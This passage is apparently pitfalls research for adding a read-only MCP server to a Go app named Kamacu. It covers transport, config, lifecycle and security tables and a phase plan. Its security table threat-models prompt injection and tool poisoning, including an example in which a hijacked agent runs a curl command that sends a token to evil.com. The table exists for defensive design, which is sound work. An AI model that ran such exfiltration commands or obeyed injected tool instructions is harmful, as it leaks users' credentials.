| Use `~/.claude.json` user scope for `mcpServers` (vs project `.mcp.json`) | Simpler — one file, always present | Cross-project token leak; survives task; collides with user's other MCP entries | Only if v1.11 explicitly decides to make Kamacu a "global user tool" — and even then, prefer project scope with per-task env |
| Add `prompts` + `resources` + `logging` capabilities alongside tools "while we're at it" | Looks more "complete" | Three more spec surfaces to maintain; deprecated `logging` (SEP-2577) creates future work; scope creep inflates the milestone | **Never** for v1.11 — `tools`-only |
| Build MCP under `internal/api/` (sharing the http.ServeMux) | One import path | Couples two transports (HTTP-to-browser, stdio-to-agent-CLI) at the route layer; an MCP bug can break the web UI | **Never** — separate package `internal/mcp/` (mirrors `internal/opencode/`, `internal/quota/` leaf-package pattern) |
| Embed the KAMACU_HOOK_TOKEN in tool closures for "convenience" | One less arg to thread | Token becomes observable in any tool result that introspects closures (Pitfall 3) — leaks via prompt injection | **Never** — token stays in `bridge` struct, never enters tool handlers |
| Use `notifications/progress` for synchronous tool results (because it's "simpler") | One code path | Per-call overhead; confuses agents that don't expect progress on a fast call; obscures real subscribe semantics (Pitfall 5) | Only for genuinely long-running tools (`subscribe`, `tail`) |
| Skip the read-modify-write + flock on `~/.claude.json` ("Kamacu is the only writer") | Faster | Concurrent tasks corrupt user config; user edits are clobbered (Pitfall 7) | **Never** — concurrent writes are the default in Kamacu (multiple tasks per project) |
| Spawn MCP subcommand with `cmd.Env = os.Environ()` (inherit everything) | Works immediately | Subcommand inherits dev junk (`DEBUG=1`, `HTTPS_PROXY=...`, `CLAUDE_CODE_*`); token leaks to child processes | Only with an explicit env scrub + the three KAMACU_* vars appended (mirrors `internal/opencode/e2e_test.go`'s `envWithoutKamacu()`) |
| Use the deprecated `roots` capability for path scoping | Spec-still-allows-it | Will break with `2026-07-28`; agent CLIs may warn users | **Never** — pass paths via tool arguments (the post-SEP-2577 direction) |

## Integration Gotchas

| Integration | Common Mistake | Correct Approach |
|-------------|----------------|------------------|
| Go MCP SDK (`modelcontextprotocol/go-sdk`) | Treating the SDK's stdio reader as synchronous (one read = one tool dispatch) | SDK runs each tool handler in its own goroutine; concurrent tool calls are the default. Design for concurrency from day one (Pitfall 5) |
| Go MCP SDK cancellation | Returning early from a tool handler without observing `ctx.Done()` | Use `req.Context()` from the handler; `select` on `<-ctx.Done()`; cancel any in-flight HTTP call (Pitfall 5) |
| Claude Code MCP config | Writing to `~/.claude.json` user scope for per-task servers | Use project-scope `.mcp.json` in the worktree; the user-scope is for global personal tools (Pitfall 7) |
| Claude Code `${VAR}` expansion | `${KAMACU_HOOK_TOKEN}` in env — depends on Claude's expansion order | The token is already in the spawned child's env via Kamacu's `manager.Spawn` (no `${}` needed in JSON). Use literal `kamacu` for `command` (PATH-resolved). Never `${VAR}` without a default (Pitfall 7) |
| Claude Code reserved names | Naming the server `workspace`, `claude-in-chrome`, `Claude Preview`, `Claude Browser`, `computer-use` | Use the literal name `kamacu` — short, lowercase, dot-free (Pitfall 7) |
| Claude Code idle timeout | Long subscribe tool that doesn't emit progress notifications | Claude Code kills stdio tools idle for 30 min default; emit `notifications/progress` every <60s; cap server-side duration at 5 min (Pitfall 5) |
| opencode MCP config | Assuming `${VAR}` expansion parity with Claude Code | Verify in opencode 1.17.x+; the v1.10 opencode plugin pattern (env-gated, file-on-disk) is the safer model — see `internal/opencode/plugin.go` |
| Kamacu HTTP API | Calling `127.0.0.1:7333` literally | Use `KAMACU_HOOK_BASE` (already injected); it reflects any `--addr` override. Mirror `hookBaseURL()` normalization for wildcard hosts (cmd/kamacu/main.go:406) |
| Kamacu token check | Re-checking the token in the MCP subcommand before each call | The MCP subcommand PRESENTS the token; Kamacu's `internal/api/hooks.go` (and the new MCP-facing routes) CHECK it via constant-time compare. Don't duplicate the check (Pitfall 3) |
| Kamacu session attach | Calling `Session.Attach` from the MCP bridge and forgetting to `Detach` | `defer s.Detach(connID)` as the FIRST line of the tool handler; the session fan-out queue lives forever otherwise (goroutine leak — Pitfall 5) |
| Panic in tool handler | Letting the panic propagate (kills the SDK's read goroutine, drops the connection) | The SDK recovers panics in `callTool` IF wrapped via `toolForErr`; verify; for non-generic handlers, add explicit `defer recover()` returning a JSON-RPC error |

## Performance Traps

| Trap | Symptoms | Prevention | When It Breaks |
|------|----------|------------|----------------|
| Per-tool HTTP client construction | High tool latency; GC churn; TLS handshake per call | Construct one `*http.Client` at subcommand startup; reuse for all calls | Any tool surface >1 call/sec |
| Synchronous snapshot + subscribe in one tool call | Head-of-line blocking on long tails | Separate `snapshot` (sync, fast) and `subscribe` (long, progress-notified) tools | Multiple agents tailing the same session |
| Unbounded tool result size | Agent CLI truncates at 25K tokens by default (`MAX_MCP_OUTPUT_TOKENS`); user sees "output truncated" warning at 10K | Cap snapshot size server-side (the ring buffer is already 256KB–1MB; tail/truncate with offset+limit pagination); stream large outputs via subscribe | Tool result >10K tokens (Claude Code warns at this threshold) |
| Fan-out N subscribe clients on one session | Kamacu's `Session.conns` map grows; mutex held during fan-out | Reuse the existing channel-buffered fan-out (already in `internal/session/session.go`); the MCP subscribe is just another Attach | Multiple concurrent `kamacu.session.subscribe` calls on one session |
| Per-tool reflection for input schema | First call latency spike; cold-start tax | Use `mcp.AddTool[In, Out]` typed registration — schema built once at startup, cached in the SDK's `SchemaCache` | First call after subcommand spawn |
| Health probe on every tool call | One extra HTTP round-trip per call | Probe once at startup; trust the connection afterward; classify connection errors as "go re-probe" (Pitfall 4) | Kamacu restarting mid-task |

## Security Mistakes

| Mistake | Risk | Prevention |
|---------|------|------------|
| Token in `os.Environ()` exposed via a debug tool | Agent ingests token; prompt-injection exfiltrates it (Pitfall 3) | No tool returns env, config, or process info unredacted; redacting slog handler as safety net |
| Tool description contains hidden instructions ("tool poisoning") | The agent trusts tool descriptions; an attacker who controls Kamacu's tool metadata controls the agent (Practical DevSecOps 2026) | Tool descriptions are Kamacu-controlled, static strings; never include user-supplied content (project names, task titles, agent output) in descriptions; pin at compile time |
| Tool result includes agent-CLI-readable confidential data (e.g. another task's content) | Cross-task information leak; an agent in task A reads task B's diff via `kamacu.task.diff(other_id)` | Scope every tool to `KAMACU_SESSION_ID`'s task by default; cross-task tools require an explicit task_id arg AND a check that the calling session's project owns both tasks |
| Subscribe tool streams raw PTY output of a *different* agent (sibling session) | Confidential work in session B exposed to the agent in session A | `kamacu.session.subscribe` defaults to `KAMACU_SESSION_ID`; subscribing to a different session_id requires the target to be in the same project AND a documented policy decision |
| MCP subcommand trusts the agent's args without validation | Malicious agent CLI passes crafted args that subvert the bridge (e.g. a fake `--base-url` exfiltrating the token to a 3rd party) | Subcommand reads ONLY `KAMACU_*` env vars + a small set of CLI flags (`--log-level`, `--help`); ignores everything else. No `--base-url` override — `KAMACU_HOOK_BASE` is the only source |
| Sampling-like primitive (server → client LLM call) exposed | Recursive LLM invocation; prompt injection amplifies (Unit 42 PoC 2 — conversation hijacking) | **Never expose `sampling/createMessage` or any server-initiated LLM call** — Kamacu's MCP server is tool-only, no sampling capability (out of scope per spec SEP-2577 deprecation direction) |
| Stale token in `.mcp.json` after Kamacu restart | Old token is now useless but still in the file; next agent session reads it, every call 401s | Cleanup-on-task-end (Pitfall 7); on subcommand startup, if first tool call returns 401, emit `kamacu_token_rejected` and self-exit (the agent CLI will surface the failure cleanly) |
| Local-only assumption relaxes Origin/Host checks for the MCP bridge | The Kamacu HTTP API already validates Origin/Host (DNS-rebinding defense) — relaxing it because "it's local" breaks the existing posture | The MCP subcommand presents the same `X-Kamacu-Token` the existing hooks receiver checks; the receiver's `hostCheck` middleware continues to apply. Don't add a "skip auth for local MCP" backdoor |
| Prompt-injection exfil via tool args | Agent (compromised by a malicious tool result from elsewhere) calls `kamacu.bash.run("curl evil.com/?token=$KAMACU_HOOK_TOKEN")` | Out of scope for v1.11: the MCP server exposes NO shell-exec tool, NO file-write tool. Read-only surface (the milestone's explicit contract). A future write surface would need per-tool permission gating |

## UX Pitfalls

| Pitfall | User Impact | Better Approach |
|---------|-------------|-----------------|
| Tool surface mirrors every Kamacu HTTP endpoint (50+ tools) | Agent's tool list is enormous; the LLM picks the wrong tool; tool-search latency spikes | Curate ~8–12 high-value tools (tasks list/move, session snapshot/subscribe, diff, projects list); defer the long tail |
| Tool names use Kamacu-internal jargon (`kamacu_session_attach_snapshot`) | Agent mistypes; users see ugly tool names in `/mcp` panel | Short, verb-noun names: `kamacu.tasks.list`, `kamacu.session.tail`, `kamacu.diff.show`. Mirror the URL hierarchy for predictability |
| Errors include JSON dumps from Kamacu's HTTP API | User sees a wall of JSON in the agent's output | Bridge translates Kamacu's error JSON into a single human/LLM-readable sentence + a typed code |
| Subscribe tool with no end condition | Agent watches forever; user stares at a 30-min idle-timeout kill | Default `duration_seconds=60`; require the agent to re-subscribe if it wants more; emit a `kamacu.session.subscribed` progress note every 10s so the agent knows it's live |
| Token-rejected error tells the agent "log in" | Agent tries to log in (no such flow), wastes turns | Error explicitly says: "Kamacu has restarted. Stop and ask the user to restart this task" — actionable, terminal |
| MCP subcommand fails to spawn (binary not on PATH) | Agent silently has no Kamacu tools; user assumes the integration is broken | The `mcpServers` entry's `command` should be the resolved absolute path of the currently-running `kamacu` binary (`os.Executable()`), not a bare `kamacu` — survives a PATH change |
| Agent-CLI registration writes config but doesn't tell the user | User launches first agent session, no Kamacu tools, no idea why | On first registration, emit a single log line to stderr (Kamacu's log file, not stdout) AND surface in the Kamacu UI: "Registered Kamacu MCP server for task N" |

## "Looks Done But Isn't" Checklist

- [ ] **Stdout discipline:** Verify `rg -n 'fmt\.Print|log\.Print|log\.Fatal' ./cmd/kamacu/mcp/ ./internal/mcp/` returns zero hits (or only stderr-explicit). Verify with a malformed-tool test that the subcommand's stdout NEVER contains non-JSON bytes.
- [ ] **Token redaction:** Verify the redacting slog handler is wired; verify no tool result, error, or log line contains the literal token (grep test).
- [ ] **Bridge error taxonomy:** Verify every HTTP failure mode (down, port-mismatch, 401, 404, 5xx, timeout, too-large) has a typed code + actionable message; verify each is covered by a test.
- [ ] **Cancellation propagation:** Verify a `subscribe` call cancelled mid-stream detaches from the session within 100ms; verify the goroutine count is stable across N subscribe/cancel cycles.
- [ ] **Protocol version:** Verify `initialize` response advertises the SDK default version set; verify no JSON-RPC batching is emitted (test against a strict 2025-06-18+ client).
- [ ] **Agent-CLI config write:** Verify project-scope `.mcp.json` is used (not user `~/.claude.json`); verify read-modify-write + flock; verify unknown fields preserved; verify cleanup on task Done.
- [ ] **Reserved name + invalid char:** Verify the registered name is `kamacu` (no dots, no reserved words); verify a hand-edit to `kamacu.foo` is rejected gracefully on next Kamacu spawn.
- [ ] **Process lifecycle:** Verify the subcommand exits within 3s of stdin EOF; verify within 3s of SIGTERM; verify `PR_SET_PDEATHSIG` is installed (Linux); verify no zombie processes after closing N agent sessions.
- [ ] **Goroutine leaks:** Verify `runtime.NumGoroutine()` returns to baseline after a full tool-call lifecycle (initialize → list → call → cancel → shutdown).
- [ ] **No shell-exec / file-write tools:** Verify `rg -n 'exec\.Command|os\.WriteFile|ioutil\.WriteFile' ./internal/mcp/` returns zero hits — the MCP surface is read-only per v1.11's Out-of-Scope.
- [ ] **Subscribe scope:** Verify `kamacu.session.subscribe(other_id)` is rejected unless the target session is in the same project as the calling `KAMACU_SESSION_ID`.
- [ ] **Multi-agent-CLI smoke:** Verify the subcommand works against (a) current Claude Code, (b) current opencode, (c) Claude Code one minor version back. Each in a real-binary e2e harness (`//go:build mcp_e2e`).
- [ ] **Idle-timeout-aware subscribe:** Verify the subscribe tool emits `notifications/progress` at least every 60s so Claude Code's 30-min stdio idle timer doesn't fire.

## Recovery Strategies

| Pitfall | Recovery Cost | Recovery Steps |
|---------|---------------|----------------|
| 1. Stdout pollution shipped to prod | LOW | Find the rogue `fmt.Println` (grep), redirect to stderr, add the CI grep check, ship a patch. The agent CLI will reconnect on next session. |
| 2. Agent CLI shows "broken server" banner for benign stderr | LOW | Lower the subcommand's log level to WARN; route INFO/DEBUG to a log file; document in the SDK `Instructions` field. |
| 3. Token leak via tool output / log | HIGH | The leaked token is per-server-instance; rotate by restarting Kamacu (mints a fresh one). Then patch the leak (redacting slog handler, fix the offending tool). Audit agent-CLI logs for the leaked token. Post-mortem required. |
| 4. Bridge returns confusing errors; agents burn turns | MEDIUM | Add the typed-error taxonomy; ship as a non-breaking patch (errors get richer, agents dispatch better). No data loss. |
| 5. Goroutine leak from subscribe | MEDIUM | Patch the missing `Detach` / context propagation. Restart long-running Kamacu to clear accumulated goroutines (or wait for the Done-TTL reaper to clean up via task Done). |
| 6. Protocol-version incompatibility with new agent CLI | LOW | Bump the Go SDK dependency; the SDK handles version negotiation. Ship a patch. |
| 7. User's `~/.claude.json` corrupted by Kamacu write | HIGH | Restore from backup (`~/.claude.json.bak` — Kamacu should write one before each modify); if no backup, the user must recreate. Patch Kamacu to write atomically + preserve unknown fields. Post-mortem required. |
| 7b. Stale `mcpServers` entry in every project | LOW | Kamacu's cleanup pass removes it on next spawn (idempotent). User can also `claude mcp remove kamacu` manually. |
| 8. Zombie subcommand after agent CLI crash | LOW | `pkill -f 'kamacu mcp serve'`. Patch with `PR_SET_PDEATHSIG` so the next iteration self-cleans. |

## Pitfall-to-Phase Mapping

> Phase IDs `MCP-1`..`MCP-n` are placeholders. The roadmap should map them onto the v1.11 Active requirements in PROJECT.md order. Suggested grouping below.

| Pitfall | Prevention Phase | Verification |
|---------|------------------|--------------|
| 1. Stdout pollution corrupts JSON-RPC stream | MCP-1 (skeleton + transport wiring) | `rg fmt.Print` zero hits in MCP packages; malformed-tool test confirms stdout stays JSON-clean — **success criterion** |
| 2. stderr ambiguity across agent CLIs | MCP-1 (logger config) + MCP-final (multi-agent-CLI smoke) | Subcommand's stderr at WARN default; live check: Claude Code AND opencode don't show "broken server" banner for routine operation |
| 3. KAMACU_HOOK_TOKEN leak | MCP-1 (redacting slog handler) + MCP-2 (first tool defines the bridge pattern) | Grep test: no tool result, log, or error contains the literal token; deliberate prompt-injection test fails to extract the token — **success criterion** |
| 4. Bridge-to-HTTP failure modes | MCP-2 (bridge layer + error taxonomy) | Each failure mode (down / port-mismatch / 401 / 404 / 5xx / timeout / too-large) covered by a test with a typed code + actionable message — **success criterion** |
| 5. Long-running subscribe / tail | MCP-subscribe (the milestone's risk-center) | Goroutine count stable across N subscribe/cancel cycles; subscribe cancelled mid-stream detaches within 100ms; partial result returned on cancel — **success criterion** |
| 6. JSON-RPC batching / version drift / deprecation wave | MCP-1 (version + capability pin) + MCP-final (compat smoke) | initialize advertises SDK defaults; no batches emitted; smoke against current + N-1 Claude Code and current opencode |
| 7. Agent-CLI config write | MCP-registration (own phase) | Project-scope `.mcp.json` only; read-modify-write + flock; unknown fields preserved; cleanup on task Done; concurrent-write test passes — **success criterion** |
| 8. Process lifecycle (zombies, SIGTERM, PR_SET_PDEATHSIG) | MCP-1 (basic shutdown) + MCP-hardening (PR_SET_PDEATHSIG + leak test) | Subcommand exits within 3s of stdin EOF / SIGTERM; no zombies after N agent sessions; `runtime.NumGoroutine()` stable — **success criterion** |
| Security (read-only surface, no sampling, no shell-exec) | All phases (design constraint) | `rg exec.Command os.WriteFile` zero hits in `./internal/mcp/`; no `sampling` capability advertised — **success criterion** |
| Performance (HTTP client reuse, schema cache, result size cap) | MCP-2 onward (per tool) | First-call latency <100ms after spawn; tool results <10K tokens by default; subscribe fans out without mutex contention |

## Suggested Phase Structure (for ROADMAP)

Based on the pitfalls above, a defensible phase ordering:

1. **MCP-1: Subcommand skeleton + transport + lifecycle** — addresses Pitfalls 1, 2, 8 (basic). Ships `kamacu mcp serve` that boots the Go SDK, redirects stdout, installs the redacting logger, handles stdin EOF + SIGTERM, exits cleanly. No tools yet. Gate: agent CLI connects, sees `tools/list` = `[]`, disconnects cleanly.
2. **MCP-2: Bridge layer + typed HTTP error taxonomy + first tool** — addresses Pitfalls 3, 4. Adds the `bridge` struct (holds token), the shared `*http.Client`, the typed error mapping, and one trivial tool (`kamacu.tasks.list`). Gate: agent can list tasks in the calling session's project; Kamacu-down surfaces a typed error.
3. **MCP-3: Tool surface (CRUD parity)** — adds the rest of the read-only tools (sessions, projects, workspaces, agents, reviews, diff, settings). No new pitfall prevention; reuses MCP-1/2 patterns. Gate: full UI parity in tool list; each tool redacts token, scopes to `KAMACU_SESSION_ID`.
4. **MCP-subscribe: Live tail** — addresses Pitfall 5. The milestone's risk center. Gate: subscribe + cancel + goroutine-stable + partial-result-on-cancel.
5. **MCP-registration: Agent-CLI config injection** — addresses Pitfall 7. Writes `.mcp.json` in the worktree at spawn; cleans up at task Done. Gate: project-scope only, no clobber, no pollution, concurrent-safe.
6. **MCP-hardening: Multi-agent-CLI smoke, security review, lifecycle hardening** — addresses residual Pitfall 8 (PR_SET_PDEATHSIG), Pitfall 2 (multi-client smoke), Pitfall 6 (version compat). Gate: real-binary e2e harness against current Claude Code AND opencode; deliberate prompt-injection test fails to extract the token.

**Phase ordering rationale:** MCP-1 must precede everything (transport + lifecycle are foundational). MCP-2's error taxonomy is a gate for every subsequent tool — without it, MCP-3's tools would each invent their own error format. MCP-subscribe is isolated as its own phase because its failure modes (goroutine leaks, cancellation) are qualitatively different from CRUD tools. MCP-registration is downstream of the tool surface (you can't register tools that don't exist). MCP-hardening is last because it cross-cuts and verifies.

**Research flags for phases:**
- **MCP-subscribe:** Highest-risk phase. Needs dedicated research on Go SDK progress-notification semantics + cancellation handshake (the 5s `notifyCancellationTimeout`). Likely a separate research spike before planning.
- **MCP-registration:** Claude Code's `${VAR}` expansion + the three-scope model need a verification pass against the actual `~/.claude.json` schema (which evolves). A spec-correlation task before planning.
- **MCP-hardening:** The `PR_SET_PDEATHSIG` syscall wrapper is non-obvious in pure Go; research the cleanest stdlib-only approach.

## Sources

- [MCP spec — Transports (2025-06-18)](https://modelcontextprotocol.io/specification/2025-06-18/basic/transports) — stdin/stdout discipline, "MUST NOT write anything to stdout that is not a valid MCP message", stderr MAY/clients MAY ambiguity (HIGH)
- [modelcontextprotocol/go-sdk — `mcp/transport.go`](https://github.com/modelcontextprotocol/go-sdk/blob/main/mcp/transport.go) — StdioTransport + ioConn implementation: json.Decoder + trailing-byte probe, batching removed in 2025-06-18, explicit "leaks a goroutine if rwc.Read does not unblock" comment, notifyCancellationTimeout=5s (HIGH)
- [modelcontextprotocol/go-sdk — `mcp/server.go`](https://github.com/modelcontextprotocol/go-sdk/blob/main/mcp/server.go) — Server.Run lifecycle, AddTool input-schema requirement, toolForErr error wrapping (regular err → IsError=true, jsonrpc.Error → direct), SEP-2577 deprecation markers (HIGH)
- [modelcontextprotocol/go-sdk — `mcp/cmd.go`](https://github.com/modelcontextprotocol/go-sdk/blob/main/mcp/cmd.go) — CommandTransport Close sequence: close stdin → wait TerminateDuration (default 5s) → SIGTERM → wait → SIGKILL (HIGH)
- [modelcontextprotocol/go-sdk — `docs/troubleshooting.md`](https://github.com/modelcontextprotocol/go-sdk/blob/main/docs/troubleshooting.md) — LoggingTransport to stderr or file; MCP Inspector for protocol debugging (HIGH)
- [modelcontextprotocol/specification issue #177 — "Please be more specific about stderr in the stdio transport"](https://github.com/modelcontextprotocol/modelcontextprotocol/issues/177) — Roo false-alarms on benign INFO logs on stderr; spec punts on interpretation (HIGH)
- [anthropics/claude-code issue #47677 — "v2.1.105 breaks all stdio MCP servers"](https://github.com/anthropics/claude-code/issues/47677) — agent-CLI side closed stdin immediately after spawn; shows fragility of stdio MCP across versions (HIGH)
- [anthropics/claude-code issue #64541 — "MCP stdio server fails to start with no error surfaced"](https://github.com/anthropics/claude-code/issues/64541) — capture child stderr during init handshake; emit visible error on non-zero exit / timeout (HIGH)
- [langchain4j issue #4873 — "MCP messages logged as error using stdio"](https://github.com/langchain4j/langchain4j/issues/4873) — confirms stderr is the correct log channel; some clients log it at ERROR level (MEDIUM)
- [mcp-stdio-guard (modelcontextprotocol discussion #753)](https://github.com/orgs/modelcontextprotocol/discussions/753) + [Reddit r/mcp showcase](https://www.reddit.com/r/mcp/comments/1tbdgqe/showcase_mcpstdioguard_catches_stdout_pollution/) — community CLI to catch stdout pollution in MCP servers (HIGH for symptom, MEDIUM for tool)
- [Foojay — "Understanding MCP Through Raw STDIO Communication"](https://foojay.io/today/understanding-mcp-through-raw-stdio-communication/) — line-delimited JSON, "Log to file, not stdout!" pattern, shutdown hooks (MEDIUM)
- [Anthropic — "Connect Claude Code to tools via MCP"](https://docs.anthropic.com/en/docs/claude-code/mcp) — three scopes (local/project/user), `.mcp.json` schema, reserved names, `${VAR}`/`${VAR:-default}` expansion, per-server `timeout`, `MCP_TIMEOUT`, `CLAUDE_CODE_MCP_TOOL_IDLE_TIMEOUT` (5 min HTTP / 30 min stdio), auto-backgrounding after 2 min (v2.1.212+), dynamic list_changed, stdio NOT auto-reconnected (HIGH)
- [Palo Alto Unit 42 — "New Prompt Injection Attack Vectors Through MCP Sampling"](https://unit42.paloaltonetworks.com/model-context-protocol-attack-vectors/) — three PoCs: resource theft via hidden prompts, conversation hijacking via persistent injection, covert tool invocation (HIGH)
- [Practical DevSecOps — "MCP Server Vulnerabilities 2026"](https://www.practical-devsecops.com/mcp-security-vulnerabilities/) — prompt injection, tool poisoning, MPMA, parasitic toolchain, over-permissioned tools, supply chain risks (HIGH)
- [Docker — "MCP Horror Stories: The GitHub Prompt Injection Data Heist"](https://www.docker.com/blog/mcp-horror-stories-github-prompt-injection/) — real-world prompt-injection breach via MCP tool output (MEDIUM)
- [Kamacu codebase — `internal/session/manager.go:178-200`](https://github.com/jordi/kamacu/blob/main/internal/session/manager.go) — D014 env contract (`KAMACU_SESSION_ID` / `KAMACU_HOOK_TOKEN` / `KAMACU_HOOK_BASE`) injected at opencode spawn (HIGH, project-local)
- [Kamacu codebase — `internal/api/hooks.go`](https://github.com/jordi/kamacu/blob/main/internal/api/hooks.go) — constant-time token compare, the receiver pattern to extend (HIGH, project-local)
- [Kamacu codebase — `internal/opencode/plugin.go`](https://github.com/jordi/kamacu/blob/main/internal/opencode/plugin.go) — silent-skip-on-absent-dir, write-if-absent, `// kamacu-managed` header — the registration discipline to mirror for `.mcpServers` (HIGH, project-local)
- [Kamacu codebase — `internal/opencode/e2e_test.go`](https://github.com/jordi/kamacu/blob/main/internal/opencode/e2e_test.go) — `//go:build opencode_e2e` host-gated real-binary e2e harness pattern; the template for the MCP real-binary e2e suite (HIGH, project-local)
- [Kamacu codebase — `internal/session/session.go:342-391`](https://github.com/jordi/kamacu/blob/main/internal/session/session.go) — `Session.Attach` / `Snapshot` / `Detach` primitives the MCP subscribe tool will call (HIGH, project-local)
- [Kamacu codebase — `cmd/kamacu/main.go:406`](https://github.com/jordi/kamacu/blob/main/cmd/kamacu/main.go) — `hookBaseURL()` wildcard-host normalization to mirror in the MCP subcommand (HIGH, project-local)

---
*Pitfalls research for: adding an MCP server (`kamacu mcp serve`, stdio) to the existing Kamacu Go 1.26 app — v1.11 Kamacu MCP Server milestone.*
*Researched: 2026-07-21.*
